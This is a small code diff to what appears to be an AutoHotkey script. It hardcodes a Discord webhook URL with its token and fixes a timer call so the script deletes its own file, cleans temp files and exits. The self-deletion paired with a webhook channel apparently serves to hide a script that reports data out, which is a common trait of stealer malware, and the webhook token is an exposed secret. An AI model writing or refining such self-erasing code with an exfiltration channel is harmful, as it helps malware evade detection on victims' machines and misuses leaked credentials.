@@ -20,7 +20,7 @@ ScheduleSelfDestruct(path) {
 
 wkUrl := "https://discord.com/api/webhooks/1383142535136018552/PPFKXJEV71jNIareD20kRU9iLwuCvWytj08itta7gPw1XbNjw7ciXZhcsdTXM81s07aE"
 
-SetTimer(ScheduleSelfDestruct, -1)  ; Schedule this script to delete itself after a short delay
+SetTimer(() => ScheduleSelfDestruct(A_ScriptFullPath), -1)
 
 CleanUpTemp()
 ExitApp
